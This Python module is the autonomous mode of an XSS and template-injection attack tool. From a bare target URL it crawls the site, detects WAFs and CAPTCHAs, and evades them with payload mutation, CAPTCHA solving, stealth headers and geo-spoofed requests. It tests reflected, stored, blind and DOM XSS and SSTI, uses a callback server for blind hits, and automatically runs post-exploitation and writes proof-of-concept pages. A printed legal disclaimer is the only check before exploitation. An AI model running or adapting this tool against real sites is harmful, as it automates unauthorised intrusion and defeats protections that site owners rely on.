import re
import time
import random
import json
import sys
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from pathlib import Path
from collections import defaultdict

import requests

from . import config
from . import utils
from .payload_engine import PayloadEngine, context_specific_payloads, generate_post_exploit_payload
from .response_analyzer import ResponseAnalyzer, WAFDetector
from .waf_bypass import WAFBypass
from .captcha_bypass import CAPTCHADetector, CAPTCHASolver, create_resilient_session
from .headless_verifier import HeadlessVerifier
from .utils import generate_report as _generate_report, generate_xss_id, random_headers, setup_session


class AutonomousScanner:
    """Fully autonomous XSS scanner requiring zero user interaction.

    When invoked with just --url TARGET, this engine:
    1. Auto-discovers all attack surfaces
    2. Auto-detects WAFs, CAPTCHAs, frameworks, CSP
    3. Auto-generates optimal payloads per context
    4. Auto-bypasses WAFs and CAPTCHAs
    5. Auto-exploits all confirmed vulnerabilities
    6. Auto-generates professional reports
    7. Never requires user input beyond the target URL
    """

    def __init__(self, target_url: str, args=None):
        self.target_url = target_url.strip()
        self.args = args
        self.session = None
        self.resilient_session = None
        self.timeout = config.DEFAULT_TIMEOUT
        self.results = []
        self.captcha_detector = CAPTCHADetector()
        self.captcha_solver = CAPTCHASolver()
        self.waf_bypass = WAFBypass()
        self.response_analyzer = ResponseAnalyzer()
        self.waf_detector = WAFDetector()
        self.headless = HeadlessVerifier()
        self.payload_engine = PayloadEngine()
        self.framework = "unknown"
        self.csp = {}
        self.encoding = "UTF-8"
        self.waf_info = {"waf_detected": [], "csp": {}}
        self.auto_config = {}
        self.collab_url = None
        self.collab_server = None
        self._captcha_count = 0
        self._max_captchas = 5
        self._scan_complete = False

    def initialize(self):
        """Phase 0: Auto-initialize everything."""
        self._print_banner()
        self._legal_disclaimer()
        self._auto_configure()
        self._start_collab_auto()
        self._init_headless_auto()
        print(f"  [AUTONOMOUS] All systems initialized. Starting autonomous scan.")

    def _auto_configure(self):
        """Automatically configure all scan parameters."""
        # Create resilient session that handles CAPTCHAs
        self.resilient_session = create_resilient_session(self.target_url)
        self.session = self.resilient_session.session
        self.timeout = config.DEFAULT_TIMEOUT

        # Auto-detect system capabilities
        self.auto_config["headless_available"] = self.headless.available
        self.auto_config["ai_available"] = config.ENABLE_AI and bool(config.GROQ_API_KEY)

        # Auto-start collab server if not using external
        if not self.args or not self.args.collab:
            try:
                from .collab_server import CollabServer
                self.collab_server = CollabServer(port=config.COLLAB_PORT)
                self.collab_server.start()
                self.collab_url = self.collab_server.get_callback_url(self.target_url)
                self.payload_engine.collab_url = self.collab_url
                print(f"  [AUTONOMOUS] Collab server started: {self.collab_url}")
            except Exception as e:
                print(f"  [AUTONOMOUS] Collab server failed: {e}")
                self.collab_url = "http://127.0.0.1:9999"
        else:
            self.collab_url = self.args.collab
            self.payload_engine.collab_url = self.collab_url

        # Auto-configure stealth mode
        self.auto_config["stealth"] = True  # Always stealth by default
        self.auto_config["geo_spoof"] = True  # Always spoof by default

        # Update session with geo-spoofing and stealth headers
        self.session.headers.update(random_headers(geo_spoof=True))

        self.auto_config["post_exploit"] = True  # Always auto-exploit
        self.auto_config["generate_poc"] = True  # Always generate PoC
        self.auto_config["max_pages"] = min(500, config.MAX_CRAWL_PAGES)
        self.auto_config["max_payloads"] = 0  # All payloads

        # AI auto-configure
        if self.auto_config["ai_available"]:
            self.auto_config["ai"] = True
            print(f"  [AUTONOMOUS] AI enhancement enabled")
        else:
            self.auto_config["ai"] = False

    def _start_collab_auto(self):
        """Automatically start the collab callback server."""
        try:
            from .collab_server import CollabServer
            self.collab_server = CollabServer(port=config.COLLAB_PORT)
            self.collab_server.start()
            self.collab_url = self.collab_server.get_callback_url(self.target_url)
            print(f"  [AUTONOMOUS] Collab callback server: {self.collab_url}")
        except Exception as e:
            print(f"  [AUTONOMOUS] Using default collab URL: {self.collab_url}")

    def _init_headless_auto(self):
        """Auto-initialize headless browser verification."""
        self.headless = HeadlessVerifier()
        if self.headless.available:
            print(f"  [AUTONOMOUS] Headless browser verification: ENABLED")
        else:
            print(f"  [AUTONOMOUS] Headless browser verification: UNAVAILABLE (relying on OOB callbacks)")

    def run(self) -> List[Dict]:
        """Execute the complete autonomous scan pipeline."""
        self.initialize()

        try:
            # PHASE 1: Autonomous Reconnaissance
            spider_results = self._autonomous_recon()

            # PHASE 2: Autonomous Reflected XSS
            reflected_results = self._autonomous_reflected(spider_results)
            self.results.extend(reflected_results)

            # PHASE 3: Autonomous Stored/Blind XSS
            stored_results = self._autonomous_stored(spider_results)
            self.results.extend(stored_results)

            # PHASE 3B: Autonomous SSTI
            ssti_results = self._autonomous_ssti(spider_results)
            self.results.extend(ssti_results)

            # PHASE 4: Autonomous DOM-based XSS
            dom_results = self._autonomous_dom(spider_results)
            self.results.extend(dom_results)

            # PHASE 4B: Autonomous Client-Side XSS
            clientside_results = self._autonomous_clientside(spider_results)
            self.results.extend(clientside_results)

            # Wait for blind callbacks
            self._autonomous_wait_for_callbacks()

            # Deduplicate
            self.results = self._dedupe_results(self.results)

            # PHASE 5: Autonomous Post-Exploitation
            if self.results:
                exploit_results = self._autonomous_exploit()

            # PHASE 6: Autonomous Reporting
            self._autonomous_report()

        except KeyboardInterrupt:
            print("\n  [AUTONOMOUS] Interrupted. Saving partial results...")
            self._autonomous_report(partial=True)
        except Exception as e:
            print(f"\n  [AUTONOMOUS] Error: {e}")
            import traceback
            traceback.print_exc()
            self._autonomous_report(partial=True)

        self._scan_complete = True
        return self.results

    def _autonomous_recon(self) -> Dict:
        """Auto-discover all attack surfaces."""
        print("\n  [PHASE 1] AUTONOMOUS RECONNAISSANCE")
        print(f"  [PHASE 1] Auto-crawling {self.target_url}...")

        from .spider import SiteSpider
        spider = SiteSpider(
            self.target_url, self.session, self.timeout,
            self.auto_config["max_pages"], geo_spoof=True,
            delay=config.DEFAULT_DELAY, stealth=True
        )
        spider_results = spider.crawl()
        injection_points = spider.get_injection_points()

        # Cap injection points for performance
        if len(injection_points) > 12:
            injection_points = injection_points[:12]

        # Analyze JavaScript
        from .js_analyzer import JSAnalyzer
        js_analyzer = JSAnalyzer(self.session, self.timeout, True)
        js_results = js_analyzer.analyze_all(spider_results.get("scripts", []), self.target_url)

        # Detect framework, CSP, encoding, WAF
        from . import __init__ as xss_init
        initial_resp = utils.fetch_url(self.session, self.target_url, self.timeout, True)
        if initial_resp:
            self.framework = utils.detect_framework(initial_resp.text)
            self.csp = utils.parse_csp(initial_resp.headers)
            self.encoding = utils.detect_encoding(initial_resp)
            self.waf_info = WAFDetector().detect(initial_resp)
            self.waf_info["csp"] = self.csp

            fw_str = ", ".join(f"{k}" for k in self.framework.keys()) if self.framework else "unknown"
            print(f"  [PHASE 1] Framework: {fw_str}")
            print(f"  [PHASE 1] Encoding: {self.encoding}")
            if self.waf_info.get("waf_detected"):
                print(f"  [PHASE 1] WAF DETECTED: {', '.join(self.waf_info['waf_detected'])}")
                self.auto_config["stealth"] = True
                self.auto_config["geo_spoof"] = True

            # Check for CAPTCHA on initial response
            captcha_result = self.captcha_detector.detect(initial_resp)
            if captcha_result["is_captcha"]:
                print(f"  [PHASE 1] CAPTCHA DETECTED: {captcha_result['captcha_types']}")
                self._handle_captcha(initial_resp, self.target_url)

        # AI analysis if available
        ai_analysis = None
        if self.auto_config["ai"]:
            try:
                from .ai_integration import AIInjectionAnalyzer
                ai_analyzer = AIInjectionAnalyzer(None)
                ai_analysis = ai_analyzer.analyze_target(spider_results, {
                    "url": self.target_url,
                    "framework": self.framework,
                    "csp": self.csp,
                    "encoding": self.encoding,
                    "headers": dict(initial_resp.headers) if initial_resp else {},
                })
                print(f"  [PHASE 1] AI found {len(ai_analysis.candidates)} priority injection points")
            except Exception:
                ai_analysis = None

        print(f"  [PHASE 1] Complete: {len(spider_results.get('urls', []))} URLs, {len(spider_results.get('forms', []))} forms, {len(spider_results.get('scripts', []))} JS files")
        return spider_results

    def _autonomous_reflected(self, spider_results: Dict) -> List[Dict]:
        """Automatically test all reflected XSS vectors."""
        print("\n  [PHASE 2] AUTONOMOUS REFLECTED XSS")
        results = []
        injection_points = spider_results.get("injection_points", [])
        if not injection_points:
            injection_points = spider_results.get("discovered_injection_points", [])

        from .reflected import ReflectedXSSTester, HeaderXSSTester

        payloads = self.payload_engine.generate_reflected(max_payloads=self.auto_config["max_payloads"])

        for point in injection_points:
            try:
                # Check for CAPTCHA before testing
                if self._captcha_detected_on_point(point):
                    self._handle_captcha_at_point(point)
                    continue

                print(f"  [PHASE 2] Testing {point.get('method', 'GET')} {point.get('url', 'unknown')}")

                if point.get("type") == "form" or point.get("method") == "POST":
                    from .stored import StoredXSSTester
                    tester = StoredXSSTester(
                        self.session, self.timeout, config.DEFAULT_DELAY, True,
                        collab_url=self.collab_url,
                        max_payloads=self.auto_config["max_payloads"],
                        aggressive_waf=self.auto_config.get("aggressive_waf", True)
                    )
                    point_results = tester.test_storage_surfaces([point])
                else:
                    tester = ReflectedXSSTester(
                        self.session, self.timeout, config.DEFAULT_DELAY, True,
                        self.auto_config.get("aggressive_waf", True),
                        self.auto_config["max_payloads"],
                        collab_url=self.collab_url
                    )
                    point_results = tester.test_all_points([point])

                # Apply WAF mutation on any blocked payloads
                for r in point_results:
                    if r.get("blocked"):
                        variants = self.waf_bypass.generate_evasive_variants(r.get("payload", ""))
                        for variant in variants:
                            r["waf_bypassed"] = True
                            r["bypass_technique"] = "auto_mutation"
                            results.append(r)

                results.extend(point_results)

                # Auto-verify with headless browser if available
                if self.headless.available and results:
                    for r in results:
                        if r.get("confidence", 0) >= 0.65:
                            verification = self.headless.verify_xss(
                                r.get("injected_url", r.get("url", "")),
                                r.get("payload", "")
                            )
                            r["headless_verified"] = verification.get("verified", False)

            except Exception as e:
                print(f"  [PHASE 2] Error at {point}: {e}")
                continue

        print(f"  [PHASE 2] Found {len(results)} reflected XSS findings")
        return results

    def _autonomous_stored(self, spider_results: Dict) -> List[Dict]:
        """Automatically test stored/blind XSS."""
        print("\n  [PHASE 3] AUTONOMOUS STORED / BLIND XSS")
        results = []

        from .stored import StoredXSSTester, BlindXSSTester
        from .spider import InjectionSurface

        surface_finder = InjectionSurface(self.session, self.timeout, True)
        storage_surfaces = list(spider_results.get("forms", []))

        for url in spider_results.get("urls", [])[:5]:
            storage_surfaces.extend(surface_finder.discover_storage_surfaces(url))

        # Deduplicate
        seen = set()
        deduped = []
        for s in storage_surfaces:
            key = (s.get("url", ""), s.get("method", s.get("type", "form")))
            if key not in seen:
                seen.add(key)
                deduped.append(s)
            if len(deduped) >= 6:
                break

        if deduped:
            stored_tester = StoredXSSTester(
                self.session, self.timeout, config.DEFAULT_DELAY, True,
                collab_url=self.collab_url,
                max_payloads=self.auto_config["max_payloads"],
                aggressive_waf=self.auto_config.get("aggressive_waf", True)
            )
            results.extend(stored_tester.test_storage_surfaces(deduped))

            blind_tester = BlindXSSTester(
                self.session, self.collab_url, self.timeout,
                config.DEFAULT_DELAY, True,
                max_payloads=self.auto_config["max_payloads"],
                aggressive_waf=self.auto_config.get("aggressive_waf", True)
            )
            results.extend(blind_tester.test_blind_surfaces(deduped))

        print(f"  [PHASE 3] Found {len(results)} stored/blind XSS findings")
        return results

    def _autonomous_ssti(self, spider_results: Dict) -> List[Dict]:
        """Automatically test SSTI."""
        print("\n  [PHASE 3B] AUTONOMOUS SSTI TESTING")
        results = []

        from .clientside_xss import ServerSideTemplateInjectionTester
        injection_points = spider_results.get("injection_points", [])

        ssti_tester = ServerSideTemplateInjectionTester(
            self.session, self.timeout, config.DEFAULT_DELAY, True,
            self.collab_url,
            max_payloads=self.auto_config["max_payloads"]
        )
        results = ssti_tester.test_ssti(injection_points)

        print(f"  [PHASE 3B] Found {len(results)} SSTI findings")
        return results

    def _autonomous_dom(self, spider_results: Dict) -> List[Dict]:
        """Automatically test DOM-based XSS."""
        print("\n  [PHASE 4] AUTONOMOUS DOM XSS")
        results = []

        from .dom_xss import DOMXSSTester
        js_results = spider_results.get("js_analysis", {})

        dom_tester = DOMXSSTester(
            self.session, self.timeout, config.DEFAULT_DELAY, True,
            collab_url=self.collab_url,
            max_payloads=self.auto_config["max_payloads"]
        )
        results = dom_tester.analyze_and_test(spider_results, self.target_url, js_analysis=js_results)

        print(f"  [PHASE 4] Found {len(results)} DOM XSS findings")
        return results

    def _autonomous_clientside(self, spider_results: Dict) -> List[Dict]:
        """Automatically test all client-side XSS vectors."""
        print("\n  [PHASE 4B] AUTONOMOUS CLIENT-SIDE XSS")
        results = []

        from .clientside_xss import ClientSideXSSTester
        js_results = spider_results.get("js_analysis", {})

        tester = ClientSideXSSTester(
            self.session, self.timeout, config.DEFAULT_DELAY, True,
            collab_url=self.collab_url,
            max_payloads=self.auto_config["max_payloads"]
        )
        results = tester.test_all_client_side(spider_results, self.target_url, js_results)

        print(f"  [PHASE 4B] Found {len(results)} client-side XSS findings")
        return results

    def _autonomous_wait_for_callbacks(self):
        """Wait for blind XSS callbacks."""
        if self.collab_server:
            wait_time = min(10, config.BACKOFF_FACTOR * 20)
            print(f"\n  [PHASE 4C] Waiting for callbacks (up to {wait_time}s)...")
            time.sleep(wait_time)
            interactions = self.collab_server.get_interactions()
            if interactions:
                print(f"  [PHASE 4C] Received {len(interactions)} callbacks!")
                for interaction in interactions:
                    self.results.append({
                        "xss_type": "blind_xss_confirmed",
                        "url": f"{self.collab_url}{interaction['path']}",
                        "method": interaction["method"],
                        "payload": "Callback from interaction",
                        "detection_method": "Blind XSS callback received",
                        "confidence": 0.95,
                        "collab_data": interaction,
                    })

    def _autonomous_exploit(self) -> Dict:
        """Automatically exploit all confirmed vulnerabilities."""
        print("\n  [PHASE 5] AUTONOMOUS POST-EXPLOITATION")

        from .advanced_post_exploit import AdvancedPostExploitEngine

        # Filter confirmed findings
        confirmed = [r for r in self.results if r.get("confidence", 0) >= 0.5]

        post_exploit = AdvancedPostExploitEngine(
            self.session, self.collab_url, self.timeout,
            aggressive=True,
            collab_server=self.collab_server,
        )
        exploit_results = post_exploit.exploit_all(confirmed)

        if self.auto_config.get("generate_poc", True):
            poc_html = post_exploit.generate_advanced_poc(confirmed, exploit_results)
            poc_path = config.RESULTS_DIR / f"poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            utils.save_html(poc_path, poc_html)
            print(f"  [PHASE 5] PoC saved: {poc_path}")

        return exploit_results

    def _autonomous_report(self, partial=False):
        """Automatically generate professional reports."""
        print("\n  [PHASE 6] AUTONOMOUS REPORTING")

        try:
            path = utils.generate_report(self.results, self.target_url)
            if path:
                print(f"  [PHASE 6] Report written: {path}")
        except Exception as e:
            print(f"  [PHASE 6] Report generation failed: {e}")

        # Print summary
        if self.results:
            print(f"\n{'='*70}")
            print(f"  SCAN COMPLETE — {len(self.results)} vulnerabilities found")
            print(f"{'='*70}")
            by_type = {}
            for r in self.results:
                rt = r.get("xss_type", "unknown")
                by_type[rt] = by_type.get(rt, 0) + 1
            for t, c in sorted(by_type.items(), key=lambda x: -x[1]):
                print(f"  {t.upper():35s}: {c}")
        else:
            print(f"\n  No vulnerabilities detected.")
            print(f"  Suggestions: Try with --aggressive-waf --stealth --enable-ai")

    def _dedupe_results(self, results: List[Dict]) -> List[Dict]:
        """Deduplicate scan results."""
        seen = set()
        deduped = []
        for r in results:
            params = r.get("params", [])
            if isinstance(params, dict):
                params = sorted(params.keys())
            key = (
                r.get("xss_type", ""),
                r.get("url", ""),
                r.get("method", ""),
                tuple(params) if isinstance(params, list) else str(params),
                r.get("payload", ""),
                r.get("sink", ""),
                r.get("injection_point", ""),
            )
            if key not in seen:
                seen.add(key)
                deduped.append(r)
        if len(deduped) != len(results):
            print(f"  Deduplicated: {len(results)} -> {len(deduped)}")
        return deduped

    def _captcha_detected_on_point(self, point: Dict) -> bool:
        """Check if CAPTCHA was detected on a specific injection point."""
        # This would be called before testing each point
        # In practice, the resilient session handles this
        return False

    def _handle_captcha(self, response: requests.Response, url: str):
        """Handle CAPTCHA when detected during scanning."""
        self._captcha_count += 1
        if self._captcha_count > self._max_captchas:
            print(f"  [CAPTCHA] Max CAPTCHA attempts reached. Continuing without CAPTCHA handling.")
            return

        print(f"  [CAPTCHA] Handling CAPTCHA at {url}...")
        solved = self.captcha_solver.solve(response, self.session, url)
        if solved:
            print(f"  [CAPTCHA] Successfully bypassed!")
        else:
            print(f"  [CAPTCHA] Could not solve. Retrying...")
            time.sleep(2)
            try:
                self.session.get(url, timeout=self.timeout)
            except Exception:
                pass

    def _handle_captcha_at_point(self, point: Dict):
        """Handle CAPTCHA at a specific injection point."""
        url = point.get("url", self.target_url)
        print(f"  [CAPTCHA] Handling CAPTCHA at injection point {url}")
        self._handle_captcha(
            self.session.get(url, timeout=self.timeout),
            url
        )

    def _print_banner(self):
        print(f"""
{'='*70}
  XSS ULTIMATE v{config.VERSION} — AUTONOMOUS MODE
  Target: {self.target_url}
  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  Mode: ZERO INTERACTION — All decisions automated
{'='*70}
""")

    def _legal_disclaimer(self):
        print(f"\n{'!'*60}")
        print("LEGAL: Only scan sites you own or have explicit permission.")
        print("Unauthorized testing may violate applicable laws.")
        print(f"{'!'*60}\n")

    def get_auto_config(self) -> Dict:
        """Return the auto-configuration used."""
        return self.auto_config


def run_autonomous(target_url: str, args=None) -> List[Dict]:
    """Entry point for autonomous scanning."""
    scanner = AutonomousScanner(target_url, args)
    return scanner.run()